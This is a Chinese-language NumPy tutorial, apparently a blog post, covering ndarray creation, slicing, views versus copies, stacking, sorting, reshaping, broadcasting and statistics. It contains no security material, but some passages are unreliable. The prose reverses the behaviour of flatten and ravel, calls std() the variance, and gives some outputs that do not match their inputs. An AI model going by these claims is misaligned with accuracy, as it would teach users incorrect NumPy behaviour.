'broadcast', 'broadcast_arrays', 'broadcast_to', 'busday_count', 'busday_offset', 'busdaycalendar', 'byte', 'byte_bounds', 'bytes0', 'bytes_', 'c_', 'can_cast', 'cast', 'cbrt', 'cdouble', 'ceil', 'cfloat', 'char', 'character', 'chararray', 'choose', 'clip', 'clongdouble', 'clongfloat', 'column_stack', 'common_type', 'compare_chararrays', 'compat', 'complex', 'complex128', 'complex64', 'complex_', 'complexfloating', 'compress', 'concatenate', 'conj', 'conjugate', 'convolve', 'copy', 'copysign', 'copyto', 'core', 'corrcoef', 'correlate', 'cos', 'cosh', 'count_nonzero', 'cov', 'cross', 'csingle', 'ctypeslib', 'cumprod', 'cumproduct', 'cumsum', 'datetime64', 'datetime_as_string', 'datetime_data', 'deg2rad', 'degrees', 'delete', 'deprecate', 'deprecate_with_doc', 'diag', 'diag_indices', 'diag_indices_from', 'diagflat', 'diagonal', 'diff', 'digitize', 'disp', 'divide', 'division', 'divmod', 'dot', 'double', 'dsplit', 'dstack', 'dtype', 'e', 'ediff1d', 'einsum', 'einsum_path', 'emath', 'empty', 'empty_like', 'equal', 'errstate', 'euler_gamma', 'exp', 'exp2', 'expand_dims', 'expm1', 'extract', 'eye', 'fabs', 'fastCopyAndTranspose', 'fft', 'fill_diagonal', 'find_common_type', 'finfo', 'fix', 'flatiter', 'flatnonzero', 'flexible', 'flip', 'fliplr', 'flipud', 'float', 'float16', 'float32', 'float64', 'float_', 'float_power', 'floating', 'floor', 'floor_divide', 'fmax', 'fmin', 'fmod', 'format_float_positional', 'format_float_scientific', 'format_parser', 'frexp', 'frombuffer', 'fromfile', 'fromfunction', 'fromiter', 'frompyfunc', 'fromregex', 'fromstring', 'full', 'full_like', 'fv', 'gcd', 'generic', 'genfromtxt', 'geomspace', 'get_array_wrap', 'get_include', 'get_printoptions', 'getbufsize', 'geterr', 'geterrcall', 'geterrobj', 'gradient', 'greater', 'greater_equal', 'half', 'hamming', 'hanning', 'heaviside', 'histogram', 'histogram2d', 'histogram_bin_edges', 'histogramdd', 'hsplit', 'hstack', 'hypot', 'i0', 'identity', 'iinfo', 'imag', 'in1d', 'index_exp', 'indices', 'inexact', 'inf', 'info', 'infty', 'inner', 'insert', 'int', 'int0', 'int16', 'int32', 'int64', 'int8', 'int_', 'int_asbuffer', 'intc', 'integer', 'interp', 'intersect1d', 'intp', 'invert', 'ipmt', 'irr', 'is_busday', 'isclose', 'iscomplex', 'iscomplexobj', 'isfinite', 'isfortran', 'isin', 'isinf', 'isnan', 'isnat', 'isneginf', 'isposinf', 'isreal', 'isrealobj', 'isscalar', 'issctype', 'issubclass_', 'issubdtype', 'issubsctype', 'iterable', 'ix_', 'kaiser', 'kron', 'lcm', 'ldexp', 'left_shift', 'less', 'less_equal', 'lexsort', 'lib', 'linalg', 'linspace', 'little_endian', 'load', 'loads', 'loadtxt', 'log', 'log10', 'log1p', 'log2', 'logaddexp', 'logaddexp2', 'logical_and', 'logical_not', 'logical_or', 'logical_xor', 'logspace', 'long', 'longcomplex', 'longdouble', 'longfloat', 'longlong', 'lookfor', 'ma', 'mafromtxt', 'mask_indices', 'mat', 'math', 'matmul', 'matrix', 'matrixlib', 'max', 'maximum', 'maximum_sctype', 'may_share_memory', 'mean', 'median', 'memmap', 'meshgrid', 'mgrid', 'min', 'min_scalar_type', 'minimum', 'mintypecode', 'mirr', 'mod', 'modf', 'moveaxis', 'msort', 'multiply', 'nan', 'nan_to_num', 'nanargmax', 'nanargmin', 'nancumprod', 'nancumsum', 'nanmax', 'nanmean', 'nanmedian', 'nanmin', 'nanpercentile', 'nanprod', 'nanquantile', 'nanstd', 'nansum', 'nanvar', 'nbytes', 'ndarray', 'ndenumerate', 'ndfromtxt', 'ndim', 'ndindex', 'nditer', 'negative', 'nested_iters', 'newaxis', 'nextafter', 'nonzero', 'not_equal', 'nper', 'npv', 'numarray', 'number', 'obj2sctype', 'object', 'object0', 'object_', 'ogrid', 'oldnumeric', 'ones', 'ones_like', 'outer', 'packbits', 'pad', 'partition', 'percentile', 'pi', 'piecewise', 'place', 'pmt', 'poly', 'poly1d', 'polyadd', 'polyder', 'polydiv', 'polyfit', 'polyint', 'polymul', 'polynomial', 'polysub', 'polyval', 'positive', 'power', 'ppmt', 'print_function', 'printoptions', 'prod', 'product', 'promote_types', 'ptp', 'put', 'put_along_axis', 'putmask', 'pv', 'quantile', 'r_', 'rad2deg', 'radians', 'random', 'rank', 'rate', 'ravel', 'ravel_multi_index', 'real', 'real_if_close', 'rec', 'recarray', 'recfromcsv', 'recfromtxt', 'reciprocal', 'record', 'remainder', 'repeat', 'require', 'reshape', 'resize', 'result_type', 'right_shift', 'rint', 'roll', 'rollaxis', 'roots', 'rot90', 'round', 'round_', 'row_stack', 's_', 'safe_eval', 'save', 'savetxt', 'savez', 'savez_compressed', 'sctype2char', 'sctypeDict', 'sctypeNA', 'sctypes', 'searchsorted', 'select', 'set_numeric_ops', 'set_printoptions', 'set_string_function', 'setbufsize', 'setdiff1d', 'seterr', 'seterrcall', 'seterrobj', 'setxor1d', 'shape', 'shares_memory', 'short', 'show_config', 'sign', 'signbit', 'signedinteger', 'sin', 'sinc', 'single', 'singlecomplex', 'sinh', 'size', 'sometrue', 'sort', 'sort_complex', 'source', 'spacing', 'split', 'sqrt', 'square', 'squeeze', 'stack', 'std', 'str', 'str0', 'str_', 'string_', 'subtract', 'sum', 'swapaxes', 'sys', 'take', 'take_along_axis', 'tan', 'tanh', 'tensordot', 'test', 'testing', 'tile', 'timedelta64', 'trace', 'tracemalloc_domain', 'transpose', 'trapz', 'tri', 'tril', 'tril_indices', 'tril_indices_from', 'trim_zeros', 'triu', 'triu_indices', 'triu_indices_from', 'true_divide', 'trunc', 'typeDict', 'typeNA', 'typecodes', 'typename', 'ubyte', 'ufunc', 'uint', 'uint0', 'uint16', 'uint32', 'uint64', 'uint8', 'uintc', 'uintp', 'ulonglong', 'unicode', 'unicode_', 'union1d', 'unique', 'unpackbits', 'unravel_index', 'unsignedinteger', 'unwrap', 'ushort', 'vander', 'var', 'vdot', 'vectorize', 'version', 'void', 'void0', 'vsplit', 'vstack', 'warnings', 'where', 'who', 'zeros', 'zeros_like']

利器之一：Ndarray
NumPy最重要的一个特点是其N维数组对象ndarray的数据结构,它是一系列同类型数据的集合,以0下标为开始进行集合中元素的索引。ndarray对象是用于存放同类型元素的多维数组。ndarray中的每个元素在内存中都有相同存储大小的区域。
ndarray这个结构引用了两个对象,一块用于保存数据的存储区域和一个用于描述元素类型的dtype对象
二维数组的生成在python中还可以用到list列表,如果用list来表示[1,2,3],由于list中的元素可以是任何对象,所以list中保存的是对象的指针,如果要保存[1,2,3]就需要三个指针和三个整数对象,是比较浪费内存资源和cpu计算时间的,而ndarray是一种保存单一数据类型的多维数组结构,在数据处理上比list列表要快上很多

1、数组和列表最关键的区别是：数组是基于向量化操作的,列表不是,在实际项目中处理的数据一般是矩阵结构,对该数据以行向量或列向量的形式进行计算,向量计算是基于数组实现的,因此数组比列表的应用更广
2、数组不能改变长度,列表可以,已经定义的numpy数组不可以增加数组大小,只能通过定义另一个数组来实现,但是列表可以增加大小。
3、数组的每一项都是同一类型,list可以有多种类型;
4、同样长度的数组所占的空间小于列表

在3D空间一个点的坐标[1, 2, 3]是一个秩为1的数组,因为它只有一个轴,那个轴长度为3
[[ 1., 0., 0.], [ 0., 1., 2.]]数组的秩为2(它有两个维度),第一个维度长度为2,第二个维度长度为3

函数和方法(method)总览
创建数组: arange, array, copy, empty, empty_like, eye, fromfile, fromfunction, identity, linspace, logspace, mgrid, ogrid, ones, ones_like, r , zeros, zeros_like
转化: astype, atleast 1d, atleast 2d, atleast 3d, mat
操作: array split, column stack, concatenate, diagonal, dsplit, dstack, hsplit, hstack, item, newaxis, ravel, repeat, reshape, resize, squeeze, swapaxes, take, transpose, vsplit, vstack
询问: all, any, nonzero, where
排序: argmax, argmin, argsort, max, min, ptp, searchsorted, sort
运算: choose, compress, cumprod, cumsum, inner, fill, imag, prod, put, putmask, real, sum
基本统计: cov, mean, std, var
基本线性代数: cross, dot, outer, svd, vdot

</pre>一维数组由列表构建,二维数组arr2d由列表的列表构建,二维数组有行和列,比如矩阵,三维数组由嵌入了两个列表的列表构建<textarea>
import numpy as np

np.array([1,2,3])        # 参数为任意序列化数据, array([1, 2, 3])

lst = [[1,3,5],[2,4,6]]  # numpy可以通过列表中的列表来构建二维数组
type(lst)                # < class 'list'>

arr = np.array(lst)      # 使用array函数从Python列表或元组中创建数组,得到的数组的类型是从Python列表中元素的类型推导出来的
type(arr)                # < class 'numpy.ndarray'>
arr                      # array([[1,3,5], [2,4,6]])

# 字面量报错
[[1 3 5]  [2 4 6]]       # SyntaxError: invalid syntax
array([1, 2, 3])         # NameError: name 'array' is not defined
np.array([1, 2, 3])      # array([1, 2, 3])

# 可以将序列的序列转换成二维数组,将序列的序列的序列转换成三维数组等
np.array([(1.5,2,3), (4,5,6)])  # array([[ 1.5,  2. ,  3. ], [ 4. ,  5. ,  6. ]])

# 可以在创建时显式指定数组的类型,bool,int,int8/16/32/64/128,uint8/13/32/64/128,float,float16/32/64,complex64/128：
np.array([[1,3,5],[2,4,6]], dtype=np.float)    # array([[1., 3., 5.], [2., 4., 6.]])

# 转换数据类型
data = np.array([[1,2,3], [4,5,6], [7,8,9]])    # 生成一个3×3的矩阵
data.dtype                                      # int32
a = data.astype(float)                          # 拷贝一份新的数组
a.dtype                                         # float64

# 另一个区别是数组要求所有项是同一个类型,list没有这个限制。如果想要一个数组包含不同类型,设置'dtype'为'object'。
arr2d_b = np.array([1, 0, 10], dtype='bool')    # 构建布尔类型数组
arr2d_b                                         # array([ True, False, True], dtype=bool)

arr1d_obj = np.array([1, 'a'], dtype='object')  # 构建包含数值和字符串的数组
arr1d_obj                                       # array([1, 'a'], dtype=object)

# 使用tolist()函数使数组转化为列表。
arr1d_obj.tolist()                              # [1, 'a']

# 属性
print(arr.shape)    # (2, 3)两行三列,返回元组表示数组的形状,数组的维度,这是一个指示数组在每个维度上大小的整数元组
print(arr.ndim)     # 2,返回数据的维数Num Dimensions,数组轴的个数,在python中轴的个数被称作秩
print(arr.dtype)    # float64,返回描述数组中元素类型的对象,可通过创造或指定dtype使用标准Python类型,另外NumPy提供它自己的数据类型
print(arr.itemsize) # 8,数组中每个元素的字节大小,float64的数组itemsiz属性值为8(=64/8),complex32的数组item属性为4(=32/8)
print(arr.size)     # 6,数组元素的总数,等于shape属性中元组元素的乘积

</textarea>一维数组被打印成行,二维数组成矩阵,三维数组成矩阵列表<textarea>
np.arange(6)    # 1d array
array([0, 1, 2, 3, 4, 5])

np.arange(12).reshape(4,3)  # 2d array
array([[ 0,  1,  2],
       [ 3,  4,  5],
       [ 6,  7,  8],
       [ 9, 10, 11]])

np.arange(24).reshape(2,3,4)  # 3d array
array([[[ 0,  1,  2,  3],
        [ 4,  5,  6,  7],
        [ 8,  9, 10, 11]],

       [[12, 13, 14, 15],
        [16, 17, 18, 19],
        [20, 21, 22, 23]]])

</textarea><pre>
切片和索引
通过索引来使用数组中的元素
ndarray对象的内容可以通过索引或切片来访问和修改,与Python中list的切片操作一样。ndarray数组可以基于0-n的下标进行索引,切片对象可以通过内置的slice函数,并设置start,stop及step参数进行,从原数组中切割出一个新数组。

从数组提取特定的项:数组的切片,切片操作是在原始数组上创建一个视图view,这只是访问数组数据的一种方式。 因此原始数组不会被复制到内存中,传递的是一个类似引用的东西,与的astype()方法是两种不同的拷贝方式

切片(一维&多维)
arr[index]           # 索引为index的元素
arr[begin:end]       # [begin end)的左闭右开区间
array[start:]
arr[:end]            # [0,end)的区间
arr[-1]              # 倒数第一个元素,适用于数据的访问
arr2[ begin : end, begin:end] # 对于多维数组arr2,和一维数组类似

</pre>一维数组可以被索引、切片和迭代,就像列表和其它Python序列<textarea>
a = arange(10)**3
a                           # array([ 0, 1, 8, 27, 64, 125, 216, 343, 512, 729])
a[2]                        # 8
a[2:5]                      # array([ 8, 27, 64])
a[:6:2] = -1000
a                           # array([-1000, 1, -1000, 27, -1000, 125, 216, 343, 512, 729])
a[ : :-1]                   # array([ 729, 512, 343, 216, 125, -1000, 27, -1000, 1, -1000])
for i in a: print i**(1/3.) # nan 1.0 nan 3.0 nan 5.0 6.0 7.0 8.0 9.0

</textarea>多维数组可以每个轴有一个索引,这些索引由一个逗号分割的元组给出,当少于轴数的索引被提供时缺失的索引被认为是整个切片<textarea>
data = np.arange(1,10).reshape(3,3)
data[:2]        # 沿着行(axis=0)进行索引,array([[1, 2, 3], [4, 5, 6]])
data[:2, :2]    # 先沿着行(axis=0)进行索引,再沿着列(axis=1)进行索引,即选择矩阵的前两行两列,array([[1, 2], [4, 5]])
data[1, 0:2]    # 下标是从0开始,array([4, 5])
data[1, 1]      # 第二行第二列的值,5
data[1]         # 第二行的值,array([4, 5, 6])

# 反转数组
data[::-1, ]      # 反转数组的行,array([[7, 8, 9],[0, 0, 0],[1, 2, 3]])
data[::-1, ::-1]  # 反转数组的行和列,array([[9, 8, 7],[0, 0, 0],[3, 2, 1]])

b[i]中括号中的表达式被当作i和一系列:,来代表剩下的轴。NumPy也允许你使用"点"像b[i,...]。
点(…)代表许多产生一个完整的索引元组必要的分号。如果x是秩为5的数组(即它有5个轴),那么:
x[1,2,…] 等同于 x[1,2,:,:,:],
x[…,3] 等同于 x[:,:,:,:,3]
x[4,…,5,:] 等同 x[4,:,:,5,:].
>>> c = array( [ [[ 0, 1, 2], # a 3D array (two stacked 2D arrays) ... [ 10, 12, 13]], ... ... [[100,

# 迭代多维数组是就第一个轴而言的
>>> for row in b:  print row
[0 1 2 3]
[10 11 12 13]
[20 21 22 23]
[30 31 32 33]
[40 41 42 43]
# 如果想对每个数组中元素进行运算,可以使用flat属性,该属性是数组元素的一个迭代器:
>>> for element in b.flat: print element,
0 1 2 3 10 11 12 13 20 21 22 23 30 31 32 33 40 41 42 43

</textarea><pre>
从现有的数组定义新数组
如果使用赋值运算符从父数组定义新数组,新数组与父数组共占同一个内存空间,如果改变新数组的值,那么父数组也相应的改变。为了让新数组与父数组相互独立,需要使用copy函数。所有父数组都使用copy方法构建新数组。
当切片对象a改变时,data的对应值也会跟着改变,这是日常数据处理中有时会疏忽的一个点,最安全的复制方法是使用copy()方法进行浅拷贝

数组的复制
Numpy.copy(arr)
创建给定array的一个副本,还可当做方法用。
after_array = array_normal[:3, 2:4].copy()
copy_array = np.copy(array_normal[:, 2:4])

</pre><textarea>
data = np.arange(1,10).reshape(3,3)
a = data[1]
print(a)            # array([4, 5, 6])
a[:] = 0
print(a, data)      # array([0, 0, 0]) array([[1, 2, 3],[0, 0, 0],[7, 8, 9]])

a = data[1].copy()
print(a)            # array([0, 0, 0])
a[:]=9
print(data)         # array([[1, 2, 3],[0, 0, 0],[7, 8, 9]])

</textarea><pre>
复制和视图
当运算和处理数组时,它们的数据有时被拷贝到新的数组,有时不是,这有三种情况:

</pre><textarea>
1、完全不拷贝
简单的赋值不拷贝数组对象或它们的数据。

a = arange(12)
b = a         # no new object is created
b is a        # True, a and b are two names for the same ndarray object
b.shape = 3,4 # changes the shape of a
a.shape       # (3, 4)

Python传递不定对象作为参考4,所以函数调用不拷贝数组。
def f(x):
    print id(x)
id(a)    # 148293216, id is a unique identifier of an object
f(a)     # 148293216

2、视图(view)和浅复制
不同的数组对象分享同一个数据。视图方法创造一个新的数组对象指向同一数据。
c = a.view()
c is a        # False
c.base is a   # True, c is a view of the data owned by a
c.flags.owndata  # False

c.shape = 2,6   # a's shape doesn't change
a.shape         # (3, 4)
c[0,4] = 1234   # a's data changes
a               # array([[ 0, 1, 2, 3],[1234, 5, 6, 7],[ 8, 9, 10, 11]])

# 切片数组返回它的一个视图：
s = a[ : , 1:3] # spaces added for clarity; could also be written "s = a[:,1:3]"
s[:] = 10  # s[:] is a view of s. Note the difference between s=10 and s[:]=10
a          # array([[ 0, 10, 10, 3],[1234, 10, 10, 7],[ 8, 10, 10, 11]])

3、深复制
这个复制方法完全复制数组和它的数据。

d = a.copy()    # a new array object with new data is created
d is a          # False
d.base is a     # False,d doesn't share anything with a
d[0,0] = 9999
a               # array([[ 0, 10, 10, 3],[1234, 10, 10, 7],[ 8, 10, 10, 11]])

</textarea>数组组合拼接<textarea>
>>> arr1 = np.arange(12).reshape(3,4)
>>> arr1     # array([[ 0,  1,  2,  3], [ 4,  5,  6,  7], [ 8,  9, 10, 11]])
>>> arr2 = arr1*3
>>> arr2     # array([[0, 3, 6, 9], [12, 15, 18, 21], [24, 27, 30, 33]])

>>> np.hstack((arr1,arr2))             # 横向拼接horizontal
array([[0, 1, 2, 3, 0, 3, 6, 9], [4, 5, 6, 7, 12, 15, 18, 21], [8, 9, 10, 11, 24, 27, 30, 33]])
>>> np.vstack((arr2,arr1))             # 纵向拼接vertical
array([[0, 3, 6, 9], [12, 15, 18, 21], [24, 27, 30, 33], [0, 1, 2, 3], [4, 5, 6, 7], [8, 9, 10, 11]])
>>> np.concatenate((arr1,arr2),axis = 1) # 横向组合,axis垂直轴
array([[0, 1, 2, 3, 0, 3, 6, 9], [4, 5, 6, 7, 12, 15, 18, 21], [8, 9, 10, 11, 24, 27, 30, 33]])
>>> np.concatenate((arr1,arr2),axis = 0) # 横向组合
array([[0, 1, 2, 3], [4, 5, 6, 7], [8, 9, 10, 11], [0, 3, 6, 9], [12, 15, 18, 21], [24, 27, 30, 33]])

</textarea>数组分裂 # hspite,  vspite,  spite(arr,way,axis)<textarea>
>>> grid = np.arange(16).reshape(4,4)
array([[ 0,  1,  2,  3], [ 4,  5,  6,  7], [ 8,  9, 10, 11], [12, 13, 14, 15]])

>>> upper,low = np.hsplit(grid,2) # 均分
>>> upper   # array([[ 0,  1], [ 4,  5], [ 8,  9], [12, 13]])
>>> low     # array([[ 2,  3], [ 6,  7], [10, 11], [14, 15]])

>>> upper,center,low = np.hsplit(grid,[1,2]) # 两个切线,分裂三部分：[0],[1],[2,3]
>>> upper   # array([[ 0], [ 4], [ 8], [12]])
>>> center  # array([[ 1], [ 5], [ 9], [13]])
>>> low     # array([[ 2,  3], [ 6,  7], [10, 11], [14, 15]])

</textarea>处理数组的缺失值(missing)和无穷大(infinite)值,缺失值可以用np.nan对象表示,np.inf表示无穷大值<textarea>
import numpy as np

# 生成一个3×3的矩阵
data = np.array([[1,2,3], [4,5,6], [7,8,9]], dtype=np.float)  # OverflowError: cannot convert float infinity to integer
data    # array([[1., 2., 3.],[4., 5., 6.],[7., 8., 9.]])

# 插入nan变量和inf变量
data[1,1] = np.nan # not a number
data[1,2] = np.inf # infinite
data    # array([[ 1.,  2.,  3.], [ 4., nan, inf], [ 7.,  8.,  9.]])

# 用-1代替nan值和inf值
missing_bool = np.isnan(data) | np.isinf(data)
data[missing_bool] = -1
data    # array([[ 1.,  2.,  3.],[ 4., -1., -1.],[ 7.,  8.,  9.]])

</textarea><pre>
数组的排序操作
直接调用数组的方法的排序将直接改变数组而不会产生新的拷贝

Numpy.sort(array_normal, axis)
np.sort()作为函数使用时不更改被排序的原始array
array.sort()作为方法使用时会对原始array修改为排序后数组array

np.sort(array_normal)          # 整体排序
np.sort(array_normal, axis=0)  # 仅行排序
np.sort(array_normal, axis=1)  # 仅列排序

</pre><textarea>
data=np.random.randn(4,4)
data  # array([[1.58669867,1.57692769,-1.85828013,1.17201164],
       [1.68160714,-0.83957549,-0.33771694,-0.33782379],
       [-0.03148106,-0.97819034,0.51126626,-0.08184963],
       [-0.02822319,-0.31934723,0.70764701,0.80444954]])

data.sort(0)    # 沿着行(axis=0)进行索引,并进行升序排序
data  # array([[-0.03148106, -0.97819034, -1.85828013, -0.33782379],
       [-0.02822319, -0.83957549, -0.33771694, -0.08184963],
       [ 1.58669867, -0.31934723,  0.51126626,  0.80444954],
       [ 1.68160714,  1.57692769,  0.70764701,  1.17201164]])

data[::-1]    # 降序操作
# array([[ 1.68160714,  1.57692769,  0.70764701,  1.17201164],
       [ 1.58669867, -0.31934723,  0.51126626,  0.80444954],
       [-0.02822319, -0.83957549, -0.33771694, -0.08184963],
       [-0.03148106, -0.97819034, -1.85828013, -0.33782379]])

</textarea><pre>
Numpy.unique(arr, return_index, return_inverse, return_counts, axis)
查找array中的唯一元素,去除数组中重复的元素

参数return_index=True/False表示新列表元素在旧列表中的位置
参数return_inverse=True/False表示旧列表元素在新列表中的位置
参数return_counts表示元素的数量,设置return_counts参数为True得到数组每一项的个数
参数axis=0/1,0表示行1表示列

</pre><textarea>
print("提取唯一元素", np.unique(array_normal))
print("提取唯一元素", np.unique(array_normal, return_index=True))
print("提取唯一元素", np.unique(array_normal, return_counts=True))
print("提取唯一元素", np.unique(array_normal, return_index=True, return_inverse=True, axis=0))

# 定义范围为[0,10)个数为10的随机整数数组
np.random.seed(100)
arr_rand = np.random.randint(0, 10, size=10)
print(arr_rand)       # [8 8 3 7 7 0 4 2 5 2]
uniqs, counts = np.unique(arr_rand, return_counts=True)  # 得到数组独特的项和相应的个数
print(uniqs, counts)  # [0 2 3 4 5 7 8] [1 2 1 1 1 2 2]

</textarea><pre>
数组的改变、数组转置、多维数组的重构(reshaping)
重构(reshaping)是改变了数组项的排列,即改变了数组的形状,未改变数组的维数。

</pre>reshape()：把指定的数组改变形状,但元素个数不变,返回新数组不对原始多维数组进行修改<textarea>
c = np.array([ [[0, 1, 2],[10, 12, 13]], [[100, 101, 102],[110, 112, 113]] ])
c.shape             # (2, 2, 3)
c.ndim              # 3
c.reshape(3, 2, 2)  # array([[[0, 1], [2, 10]], [[12, 13], [100, 101]], [[102, 110], [112, 113]]])

# 某一维指定为-1时自动计算维度
c.reshape(3, -1)    # array([[0, 1, 2, 10], [12, 13, 100, 101], [102, 110, 112, 113]])
c.reshape(2, -1, 2) # array([[[0, 1], [2, 10], [12, 13]], [[100, 101], [102, 110], [112, 113]]])

</textarea>resize(a, new_shape)：把指定的数组改变形状,但元素个数可变,不足补0,返回新数组不对原始多维数组进行修改<textarea>
a = np.array([[[0, 1, 2], [10, 12, 13]], [[100, 101, 102], [110, 112, 113]]])
b = np.array([[[0, 1, 2], [10, 12, 13]], [[100, 101, 102], [110, 112, 113]]])
a1 = np.resize(a, (3, 1))
b1 = np.resize(b, (3, 5))
a1  # array([[0],[1],[2]])
a   # array([[[  0,   1,   2], [ 10,  12,  13]], [[100, 101, 102], [110, 112, 113]]])
b1  # array([[  0,   1,   2,  10,  12], [ 13, 100, 101, 102, 110], [112, 113,   0,   1,   2]])

</textarea><pre>
扁平(flattening)是对多维数组转化为一维数组。
数组的扁平化有两种常用的方法flatten()和ravel()。flatten处理后的数组是父数组的引用,因此新数组的任何变化也会改变父数组,因其未用复制的方式构建数组,内存使用效率高,ravel通过复制的方式构建新数组

</pre><textarea>
arr = np.arange(12)        # array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11])
arr = arr.reshape(3,4)     # array([[ 0,  1,  2,  3], [ 4,  5,  6,  7], [ 8,  9, 10, 11]])

newarr = arr.flatten()     # array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11])
newarr[0] = 100
newarr                     # array([100,   1,   2,   3,   4,   5,   6,   7,   8,   9,  10,  11])
arr                        # array([[ 0,  1,  2,  3], [ 4,  5,  6,  7], [ 8,  9, 10, 11]])

newarr2 = arr.ravel()      # array([ 0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11])
newarr2[0] = 200
newarr2                    # array([200,   1,   2,   3,   4,   5,   6,   7,   8,   9,  10,  11])
arr                        # array([[ 200,  1,  2,  3], [ 4,  5,  6,  7], [ 8,  9, 10, 11]])

</textarea><pre>
数组运算
数组上的算术运算符会应用到元素级别
在numpy中的linalg中有还有很多矩阵运算,比如svd分解,qr分解,cholesky分解等

数组与数的运算(加、减、乘、除、取整、取模)
</pre><textarea>
score[:, :] = score[:, :]+5     # 循环数组行和列,每一个数值都加5
score[:, :] = score[:, :]-5     # 循环数组行和列,每一个数值都减5
score[:, :] = score[:, :]*5     # 循环数组行和列,每一个数值都乘以5
score[:, :] = score[:, :]/5     # 循环数组行和列,每一个数值都除以5
score[:, :] = score[:, :] // 5  # 循环数组行和列,每一个数值除以5取整
score[:, :] = score[:, :] % 5   # 循环数组行和列,每一个数值除以5取模

</textarea><pre>
数组间运算(加、减、乘、除),前提是两个数组的shape一样
加："+"或np.add(a, b)　　
减："-"或np.subtract(a, b)　　
乘："*"或np.multiply(a, b)　　
除："/"或np.divide(a, b)

</pre><textarea>
c = score + score
d = score - score
e = score * score
b = score / score  # 分母数组保证每个数值不能为0

</textarea>函数可以应用到数组的每一项,列表不行<textarea>
list1 = [0,1,2,3,4]
list1 + 2       # 错误,不可以对列表的每一项数据都加2
[i+2 for i in list1]
a = range(1000)
a = [i**2 for i in a]

arr1 = np.arange(10, 50, 10)
arr2 = np.array([4,3,2,1])
arr1 + 2         # array([12, 22, 32, 42])
arr1+arr2         # array([14, 23, 32, 41])
arr1-arr2         # array([ 6, 17, 28, 39])
arr1*arr2         # array([40, 60, 60, 40])
arr1/arr2         # array([ 2.5       ,  6.66666667, 15.        , 40.        ])
arr1**2          # array([ 100,  400,  900, 1600], dtype=int32)
10*np.sin(arr1)  # array([-5.44021111,  9.12945251, -9.88031624,  7.4511316 ])
arr1<35          # array([ True,  True,  True, Faarre])

data = np.array([[1,2,3], [4,5,6], [7,8,9]])  # 生成一个3×3的矩阵
print(data + data)        # array([[ 2,  4,  6],[ 8, 10, 12],[14, 16, 18]])
print(data * data)        # array([[ 1,  4,  9], [16, 25, 36], [49, 64, 81]])

# 相同规格的数组计算是直接作用在其元素级上的,不同规格的数组一起计算的话是会报出广播错误的
data1 = np.array([[1,2],[1,2]])  # 生成一个2x2numpy数组
# print(data + data1)            # ValueError: operands could not be broadcast together with shapes (3,3) (2,2)

# data2数组的列数量与data数组相等,data3数组的行数量与data数组相等,这两个numpy数组虽然规格与data数组不一样,但却依然可以与data数组进行运算
data2 = np.array([[1,2,3]])
print(data + data2)              # array([[ 2,  4,  6],[ 5,  7,  9],[ 8, 10, 12]])
data3 = np.array([[1],[2],[3]])
print(data + data3)              # array([[ 2,  3,  4],[ 6,  7,  8],[10, 11, 12]])

# 有些操作符像+=和*=被用来更改已存在数组而不创建一个新的数组
a = np.ones((2,3), dtype=int)
b = np.random.random((2,3))
a *= 3
a         # array([[3, 3, 3], [3, 3, 3]])
b += a
b         # array([[ 3.69092703, 3.8324276 , 3.0114541 ], [ 3.18679111, 3.3039349 , 3.37600289]])
a += b    # UFuncTypeError: Cannot cast ufunc 'add' output from dtype('float64') to dtype('int32') with casting rule 'same_kind'

# 当运算的是不同类型的数组时,结果数组和更普遍和精确的已知(这种行为叫做upcast)
a = np.ones(3, dtype=int32)
b = np.linspace(0,pi,3)
b.dtype.name   # 'float64'
c = a+b
c              # array([ 1. , 2.57079633, 4.14159265])
c.dtype.name   # 'float64'
d = np.exp(c*1j)
d              # array([ 0.54030231+0.84147098j, -0.84147098+0.54030231j, -0.54030231-0.84147098j])
d.dtype.name   # 'complex128'

</textarea>数组的布尔索引<textarea>
data = np.arange(1,10).reshape(3,3)
print(data)            # array([[1, 2, 3],[4, 5, 6],[7, 8, 9]])
print(data>3)          # array([[False, False, False],[ True,  True,  True],[ True,  True,  True]])
print(data[data>3])    # 找出大于3的元素, array([4, 5, 6, 7, 8, 9])
b = data>3
print(data[b])         # 同上

# 数组的逻辑表达处理：条件运算Numpy.where(condition, x, y)三目运算满足condition则为x,否则为y
np.where(data>3, 1, 0) # 大于3的标记为1,小于等于3的标记为0,array([[0, 0, 0],[1, 1, 1],[1, 1, 1]])

ls = np.arange(1, 11).reshape([2,5])
np.exp(ls)     # 指数
# array([[2.71828183e+00, 7.38905610e+00, 2.00855369e+01, 5.45981500e+01, 1.48413159e+02],
       [4.03428793e+02, 1.09663316e+03, 2.98095799e+03, 8.10308393e+03, 2.20264658e+04]])

np.sqrt(ls)    # 开方
# array([[1.        , 1.41421356, 1.73205081, 2.        , 2.23606798],
       [2.44948974, 2.64575131, 2.82842712, 3.        , 3.16227766]])

</textarea>NumPy中的乘法运算符*指示按元素计算,矩阵乘法可以使用dot函数或创建矩阵对象实现<textarea>
>>> A = np.array( [[1,1],[0,1]] )
>>> B = np.array( [[2,0],[3,4]] )
>>> A*B           # elementwise product
array([[2, 0],[0, 4]])
>>> np.dot(A,B)   # matrix product
array([[5, 4],[3, 4]])

</textarea>数组的常用统计运算操作<textarea>
data = np.arange(1,10).reshape(3,3)
data.max()             # 最大值,9
data.min()             # 最小值,1
np.amin(data, axis=0)  # 求数组行和列的最小值,axis=0表示列,axis=1表示行,返回列表
(data>3).sum()         # 统计数组中元素大于3的个数, 6
data.sum()             # 45
Numpy.sum()            # 求和
Numpy.median           # 求中值
data.mean()            # 平均值
data.mean(axis=0)      # 沿着行(axis=0)进行索引,求出其平均值,array([4., 5., 6.])
data.any()             # 数组中是否存在一个或多个true,True
data.all()             # 数组中是否全部数都是true,True
data.cumsum(0)         # 沿着行(axis=0)进行索引,进行累加,array([[1, 2, 3],[5, 7, 9],[12, 15, 18]], dtype=int32)
np.cumsum(data)        # 对数组的每个元素进行累加得到一维数组,大小与二维数组相同,array([1,3,6,10,15,21,28,36,45],dtype=int32)
data.cumprod(1)        # 沿着列(axis=1)进行索引,进行累乘,array([[  1,   2,   6],[  4,  20, 120],[  7,  56, 504]], dtype=int32)
data.std()             # 求出全部元素的方差,2.581988897471611

# 指定轴最大值：amax(arr, axis)
score = np.array([[80, 88], [82, 81], [84, 75], [86, 83], [75, 81]])
np.amax(score)            # 求整个矩阵的最大值
np.amax(score, axis=0)    # 求每一列的最大值(0表示行)
np.amax(score, axis=1)    # 求每一行的最大值(1表示列)

